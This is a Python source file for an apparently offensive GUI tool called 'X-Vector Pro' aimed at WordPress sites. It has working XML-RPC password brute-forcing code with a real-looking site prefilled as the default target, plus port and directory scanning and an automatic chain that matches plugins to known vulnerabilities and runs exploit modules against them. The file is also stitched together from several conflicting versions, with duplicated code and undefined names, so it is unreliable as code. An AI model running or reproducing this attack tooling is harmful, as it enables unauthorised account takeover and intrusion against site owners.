# main.py
import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading

# === Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

# === Tabbed Layout ===
tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# === Add Tabs ===
recon_tab = tabs.add("Recon")
import requests
import tldextract

def run_recon():
    target = recon_url_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a target URL.")
        return

    recon_output.delete("0.0", "end")
    recon_output.insert("end", f"[*] Starting recon on {target}...\n")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X-Vector Recon Bot)"
        }
        r = requests.get(target, headers=headers, timeout=10)

        # Server Headers
        recon_output.insert("end", "\n--- Headers ---\n")
        for key, value in r.headers.items():
            recon_output.insert("end", f"{key}: {value}\n")

        # Title
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            recon_output.insert("end", f"\n[*] Title: {title}\n")

        # CMS Detection
        recon_output.insert("end", "\n--- CMS Detection ---\n")
        if "wp-content" in r.text or "/wp-login.php" in r.text:
            recon_output.insert("end", "[+] WordPress Detected\n")
        elif "Joomla!" in r.text:
            recon_output.insert("end", "[+] Joomla Detected\n")
        elif "Drupal" in r.text:
            recon_output.insert("end", "[+] Drupal Detected\n")
        else:
            recon_output.insert("end", "[-] CMS Not Identified\n")

        # IP + Domain Info
        extracted = tldextract.extract(target)
        base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)
        ip = requests.get(f"https://dns.google/resolve?name={base_domain}&type=A").json()
        if "Answer" in ip:
            ip_addr = ip["Answer"][0]["data"]
            recon_output.insert("end", f"\n[*] IP Address: {ip_addr}\n")

    except Exception as e:
        recon_output.insert("end", f"[!] Recon failed: {e}\n")
import socket
# === Recon UI Layout ===
ctk.CTkLabel(recon_tab, text="Target URL (https://example.com)").pack(pady=5)
recon_url_entry = ctk.CTkEntry(recon_tab, width=700)
recon_url_entry.pack()

ctk.CTkButton(recon_tab, text="Run Recon", command=lambda: threading.Thread(target=run_recon).start()).pack(pady=10)

recon_output = ctk.CTkTextbox(recon_tab, height=400, width=800)
recon_output.pack()
scanner_tab = tabs.add("Scanner")
brute_tab = tabs.add("Brute Force")
exploit_tab = tabs.add("Exploits")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# =====================
# === BRUTE FORCE TAB
# =====================
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

import xmlrpc.client  # moved up for logic reuse

ctk.CTkLabel(brute_tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(brute_tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(brute_tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(brute_tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(brute_tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(brute_tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(brute_tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, height=200, width=700)
log_box.pack()

# ==========================
# === STUBS FOR OTHER TABS
# ==========================

ctk.CTkLabel(recon_tab, text="Recon module coming soon...").pack(pady=20)
ctk.CTkLabel(scanner_tab, text="Scanner module coming soon...").pack(pady=20)
ctk.CTkLabel(exploit_tab, text="Exploit module coming soon...").pack(pady=20)
ctk.CTkLabel(logs_tab, text="Logs will appear here.").pack(pady=20)
ctk.CTkLabel(settings_tab, text="Settings module coming soon...").pack(pady=20)

# === Start GUI ===
app.mainloop()

import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import json
import os
import tkinter as tk
from tkinter import ttk, messagebox
import os
import json
from utils.ascii_banner import print_banner

if headless_mode:
    print_banner()
    # ...continue CLI flow
class XVectorPro(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro :: WordPress Brute Force GUI")
        self.geometry("720x480")
        self.resizable(False, False)
        self.create_widgets()

    def create_widgets(self):
        tabControl = ttk.Notebook(self)

        # Tabs
        self.brute_tab = ttk.Frame(tabControl)
        self.settings_tab = ttk.Frame(tabControl)
        self.log_tab = ttk.Frame(tabControl)

        tabControl.add(self.brute_tab, text='Brute Force')
        tabControl.add(self.settings_tab, text='Settings')
        tabControl.add(self.log_tab, text='Logs')
        tabControl.pack(expand=1, fill="both")

        self.setup_brute_tab()
        self.setup_settings_tab()
        self.setup_log_tab()

    def setup_brute_tab(self):
        ttk.Label(self.brute_tab, text="Target URL (xmlrpc.php):").pack(pady=5)
        self.target_entry = ttk.Entry(self.brute_tab, width=50)
        self.target_entry.pack(pady=5)

        ttk.Label(self.brute_tab, text="Username(s):").pack(pady=5)
        self.user_entry = ttk.Entry(self.brute_tab, width=50)
        self.user_entry.pack(pady=5)

        ttk.Label(self.brute_tab, text="Wordlist Path:").pack(pady=5)
        self.wordlist_entry = ttk.Entry(self.brute_tab, width=50)
        self.wordlist_entry.pack(pady=5)

        ttk.Button(self.brute_tab, text="Start Attack", command=self.start_attack).pack(pady=20)

    def setup_settings_tab(self):
        ttk.Label(self.settings_tab, text="Configuration will go here").pack(pady=10)

    def setup_log_tab(self):
        ttk.Label(self.log_tab, text="Log Output").pack()
        self.log_output = tk.Text(self.log_tab, height=20, width=80)
        self.log_output.pack()

    def log(self, msg):
        self.log_output.insert(tk.END, msg + "\n")
        self.log_output.see(tk.END)

    def start_attack(self):
        url = self.target_entry.get()
        users = self.user_entry.get().split(',')
        wordlist = self.wordlist_entry.get()

        if not os.path.isfile(wordlist):
            messagebox.showerror("Error", "Invalid wordlist path")
            return

        self.log("[+] Starting brute force on: " + url)
        self.log("[*] Using users: " + ', '.join(users))
        self.log("[*] Wordlist: " + wordlist)

        # Placeholder logic -- connect to real engine
        self.log("[!] Attack simulated. Add backend engine.")

if __name__ == '__main__':
    app = XVectorPro()
    app.mainloop()
from utils.logger import log_to_central
from utils.settings import load_settings
from utils.splash import show_splash_screen
from core.recon.recon_engine import ReconEngine
from gui.dashboard import ReconViewer
from ui.tabs import init_tabs

class XVectorGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("X-Vector Pro | Silent. Adaptive. Lethal.")
        self.geometry("1024x700")

        # Appearance settings
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        # Show splash
        show_splash_screen()

        # Recon Viewer
        self.recon_viewer = ReconViewer(self)
        self.recon_viewer.pack(fill="both", expand=True)

        # Tab view
        self.tabs = ctk.CTkTabview(self, width=980, height=620)
        self.tabs.pack(padx=10, pady=10)

        # Load settings and initialize UI tabs
        settings = load_settings()
        init_tabs(self.tabs, self, settings)

def launch_gui():
    app = XVectorGUI()
    app.mainloop()

if __name__ == "__main__":
    launch_gui()
def run_full_auto_mode():
    url = fullauto_url_entry.get().strip()
    if not url.startswith("http"):
        fullauto_log("[!] Invalid URL. Use full http/https format.")
        return

    fullauto_log("[*] Starting full auto mode...")

    # Recon Phase
    try:
        fullauto_log("[*] Running Recon...")
        r = requests.get(url, timeout=10)
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            fullauto_log(f"    [+] Site title: {title}")
    except Exception as e:
        fullauto_log(f"[!] Recon failed: {e}")

    # Port Scan Phase
    try:
        fullauto_log("[*] Running Port Scan...")
        target_host = tldextract.extract(url).registered_domain
        ip = socket.gethostbyname(target_host)
        for port in [21, 22, 80, 443, 3306]:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                if s.connect_ex((ip, port)) == 0:
                    fullauto_log(f"    [+] Open port: {port}")
                s.close()
            except:
                continue
    except Exception as e:
        fullauto_log(f"[!] Port scan failed: {e}")

    # Dir Scan Phase (simplified)
    try:
        fullauto_log("[*] Running Dir Scan...")
        common_dirs = ["admin", "login", "wp-admin", "config"]
        for d in common_dirs:
            check = f"{url.rstrip('/')}/{d}"
            try:
                resp = requests.get(check, timeout=3)
                if resp.status_code in [200, 301, 403]:
                    fullauto_log(f"    [+] Found: {check} ({resp.status_code})")
            except:
                continue
    except Exception as e:
        fullauto_log(f"[!] Dir scan failed: {e}")

    # Plugin/Theme Detection + CVE Matching
    try:
        fullauto_log("[*] Checking for plugins/themes...")
        r = requests.get(url, timeout=10)
        html = r.text
        found_plugins = []
        with open("cve_db.json") as f:
            vuln_db = json.load(f)

        for plugin in vuln_db:
            if f"/wp-content/plugins/{plugin}" in html:
                version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version_match:
                    version = version_match.group(1)
                    if version in vuln_db[plugin]:
                        fullauto_log(f"    [!!] {plugin} v{version} is vulnerable!")
                        fullauto_log(f"         → {vuln_db[plugin][version]['desc']}")
                        found_plugins.append(vuln_db[plugin][version]['exploit'])
        if not found_plugins:
            fullauto_log("    [-] No known vulnerable plugins found.")
    except Exception as e:
        fullauto_log(f"[!] Plugin check failed: {e}")
        return

    # Exploit Chain
    for exploit in found_plugins:
        fullauto_log(f"[*] Launching exploit: {exploit}")
        try:
            path = os.path.join("exploits", f"{exploit}.py")
            spec = importlib.util.spec_from_file_location(exploit, path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            result = mod.run(url)
            fullauto_log(f"    [+] Result: {result}")
        except Exception as e:
            fullauto_log(f"    [!] Exploit failed: {e}")

    fullauto_log("[*] Full auto mode completed.")
import requests
import tldextract

def run_recon():
    target = recon_url_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a target URL.")
        return

    recon_output.delete("0.0", "end")
    recon_output.insert("end", f"[*] Starting recon on {target}...\n")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X-Vector Recon Bot)"
        }
        r = requests.get(target, headers=headers, timeout=10)

        # Server Headers
        recon_output.insert("end", "\n--- Headers ---\n")
        for key, value in r.headers.items():
            recon_output.insert("end", f"{key}: {value}\n")

        # Title
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            recon_output.insert("end", f"\n[*] Title: {title}\n")

        # CMS Detection
        recon_output.insert("end", "\n--- CMS Detection ---\n")
        if "wp-content" in r.text or "/wp-login.php" in r.text:
            recon_output.insert("end", "[+] WordPress Detected\n")
        elif "Joomla!" in r.text:
            recon_output.insert("end", "[+] Joomla Detected\n")
        elif "Drupal" in r.text:
            recon_output.insert("end", "[+] Drupal Detected\n")
        else:
            recon_output.insert("end", "[-] CMS Not Identified\n")

        # IP + Domain Info
        extracted = tldextract.extract(target)
        base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)
        ip = requests.get(f"https://dns.google/resolve?name={base_domain}&type=A").json()
        if "Answer" in ip:
            ip_addr = ip["Answer"][0]["data"]
            recon_output.insert("end", f"\n[*] IP Address: {ip_addr}\n")

    except Exception as e:
        recon_output.insert("end", f"[!] Recon failed: {e}\n")

# === Recon UI Layout ===
ctk.CTkLabel(recon_tab, text="Target URL (https://example.com)").pack(pady=5)
recon_url_entry = ctk.CTkEntry(recon_tab, width=700)
recon_url_entry.pack()

ctk.CTkButton(recon_tab, text="Run Recon", command=lambda: threading.Thread(target=run_recon).start()).pack(pady=10)

recon_output = ctk.CTkTextbox(recon_tab, height=400, width=800)
recon_output.pack()
